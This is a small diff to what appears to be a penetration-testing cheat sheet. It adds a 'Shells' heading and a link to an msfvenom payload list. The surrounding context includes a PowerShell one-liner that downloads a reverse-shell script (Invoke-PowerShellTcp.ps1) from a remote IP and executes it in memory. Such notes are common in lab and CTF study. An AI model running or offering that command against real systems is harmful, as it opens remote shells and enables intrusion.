@@ -129,6 +129,10 @@ Windows Site:
 
 - C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')
 
+# Shells
+
+https://www.yeahhub.com/msfvenom-all-payload-examples-cheatsheet-2017/
+
 # Privilige Escalation
 
 -Windows
